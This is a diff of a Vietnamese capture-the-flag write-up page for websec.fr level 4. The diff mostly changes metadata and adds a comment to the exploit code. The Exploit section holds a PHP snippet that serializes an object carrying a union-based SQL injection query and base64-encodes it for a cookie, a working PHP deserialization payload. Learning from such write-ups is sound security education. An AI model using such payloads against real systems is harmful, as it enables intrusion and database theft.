@@ -23,22 +23,15 @@
 <meta property="og:site_name" content="Khado">
 <meta property="og:description" content="https:&#x2F;&#x2F;websec.fr&#x2F;level04&#x2F;index.php  Information GatheringChallenge này có chỗ input là id, nhưng không giống như Level 1 là sẽ ra lỗi khi nhập ký tự đặc biệt. Với giá trị cookie leet_hax0r: Decode b">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv4/image1.png">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv4/image2.png">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv4/ser_deser.png">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv4/image3.png">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv4/image4.png">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv4/image5.png">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv4/image6.png">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv4/image7.png">
+<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv4/index_img.png">
 <meta property="article:published_time" content="2022-07-19T14:05:12.000Z">
-<meta property="article:modified_time" content="2022-08-16T14:58:59.921Z">
+<meta property="article:modified_time" content="2022-10-12T01:42:48.063Z">
 <meta property="article:author" content="Khado">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="babysteps">
 <meta property="article:tag" content="unserialize">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://dovankha.github.io/img/CTF/WebSec/lv4/image1.png">
+<meta name="twitter:image" content="https://dovankha.github.io/img/CTF/WebSec/lv4/index_img.png">
   
   
   
@@ -327,7 +320,7 @@
 <hr>
 <h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Để ý dòng code ở source 2. Thì giá trị cookie leet_hax0r được <code>encode base64</code>.</p>
 <p>Mình sẽ tạo dòng Code giống class SQL để serialize nó.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQL</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$query</span>=<span class="hljs-string">&#x27;select username from users where id = -1 union select sql from sqlite_master&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SQL</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>), PHP_EOL;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQL</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$query</span>=<span class="hljs-string">&#x27;select username from users where id = -1 union select sql from sqlite_master&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SQL</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>), PHP_EOL; <span class="hljs-comment">// PHP_EOL: print new line</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>
 
 <p>Sau khi bulid source xong, run code sẽ ra Object và đoạn base64 như sau:</p>
 <p><img src="/img/CTF/WebSec/lv4/image3.png" srcset="/img/loading.gif" lazyload alt="Serialize SQL Object"></p>
